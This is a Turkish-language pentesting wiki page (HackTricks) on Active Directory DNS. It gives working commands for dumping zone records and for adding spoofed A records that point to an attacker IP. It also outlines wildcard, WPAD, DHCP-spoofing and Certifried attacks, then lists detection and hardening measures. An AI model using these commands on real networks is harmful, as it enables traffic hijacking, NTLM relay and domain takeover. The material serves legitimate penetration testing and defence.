# AD DNS Kayıtları

{{#include ../../banners/hacktricks-training.md}}

Varsayılan olarak **herhangi bir kullanıcı** Active Directory'de **tüm DNS kayıtlarını** Domain veya Orman DNS alanlarında **listeleyebilir**, bu bir alan transferine benzer (kullanıcılar, bir AD ortamında bir DNS alanının alt nesnelerini listeleyebilir).

Araç [**adidnsdump**](https://github.com/dirkjanm/adidnsdump), iç ağların keşif amaçları için alandaki **tüm DNS kayıtlarının** **listelemesini** ve **dışa aktarılmasını** sağlar.
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (Nisan 2025) JSON/Greppable (`--json`) çıktısı, çoklu iş parçacığı DNS çözümü ve LDAPS'ye bağlanırken TLS 1.2/1.3 desteği ekler.

Daha fazla bilgi için [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## Kayıt Oluşturma / Değiştirme (ADIDNS sahteciliği)

**Authenticated Users** grubunun varsayılan olarak alan DACL'sinde **Create Child** yetkisi olduğundan, herhangi bir etki alanı hesabı (veya bilgisayar hesabı) ek kayıtlar kaydedebilir. Bu, trafik kaçırma, NTLM relay zorlaması veya hatta tam etki alanı ele geçirme için kullanılabilir.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py, Impacket ≥0.12.0 ile birlikte gelir)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Yaygın saldırı ilkelere

1. **Wildcard kaydı** – `*.<zone>` AD DNS sunucusunu LLMNR/NBNS sahteciliğine benzer şekilde kurumsal çapta bir yanıtlayıcıya dönüştürür. NTLM hash'lerini yakalamak veya LDAP/SMB'ye iletmek için kötüye kullanılabilir. (WINS araması devre dışı bırakılmalıdır.)
2. **WPAD kaçırma** – `wpad` (veya Global-Query-Block-List'i atlamak için bir saldırgan ana bilgisayara işaret eden bir **NS** kaydı) ekleyin ve kimlik bilgilerini toplamak için dışa çıkan HTTP isteklerini şeffaf bir şekilde proxy'leyin. Microsoft, wildcard/DNAME atlamalarını (CVE-2018-8320) yamanladı ancak **NS-kayıtları hala çalışıyor**.
3. **Eski giriş ele geçirme** – daha önce bir iş istasyonuna ait olan IP adresini talep edin ve ilişkili DNS girişi hala çözümlenecektir, bu da kaynak tabanlı kısıtlı delegasyon veya Shadow-Credentials saldırılarına DNS'e dokunmadan olanak tanır.
4. **DHCP → DNS sahteciliği** – varsayılan bir Windows DHCP+DNS dağıtımında, aynı alt ağda kimlik doğrulaması yapılmamış bir saldırgan, dinamik DNS güncellemelerini tetikleyen sahte DHCP istekleri göndererek mevcut herhangi bir A kaydını (Domain Controller'lar dahil) üzerine yazabilir (Akamai “DDSpoof”, 2023). Bu, Kerberos/LDAP üzerinde makine-arasında bir konum sağlar ve tam alan ele geçirmeye yol açabilir.
5. **Certifried (CVE-2022-26923)** – kontrol ettiğiniz bir makine hesabının `dNSHostName` değerini değiştirin, eşleşen bir A kaydı kaydedin, ardından bu isim için bir sertifika talep edin ve DC'yi taklit edin. **Certipy** veya **BloodyAD** gibi araçlar akışı tamamen otomatikleştirir.

---

## Tespit ve güçlendirme

* Hassas alanlarda **Kimlik Doğrulanmış Kullanıcılar**'a *Tüm çocuk nesneleri oluşturma* hakkını reddedin ve dinamik güncellemeleri DHCP tarafından kullanılan özel bir hesaba devredin.
* Dinamik güncellemeler gerekiyorsa, alanı **Sadece Güvenli** olarak ayarlayın ve yalnızca sahip bilgisayar nesnesinin kendi kaydını üzerine yazabilmesi için DHCP'de **İsim Koruması**'nı etkinleştirin.
* DNS Sunucusu olay kimliklerini 257/252 (dinamik güncelleme), 770 (alan transferi) ve `CN=MicrosoftDNS,DC=DomainDnsZones`'a LDAP yazmalarını izleyin.
* Tehlikeli isimleri (`wpad`, `isatap`, `*`) kasıtlı olarak zararsız bir kayıt veya Global Sorgu Engelleme Listesi aracılığıyla engelleyin.
* DNS sunucularını güncel tutun – örneğin, RCE hataları CVE-2024-26224 ve CVE-2024-26231 **CVSS 9.8**'e ulaştı ve Domain Controller'lara karşı uzaktan istismar edilebilir.

## Referanslar

* Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, hala wildcard/WPAD saldırıları için de-facto referans)
* Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Aralık 2023)
{{#include ../../banners/hacktricks-training.md}}
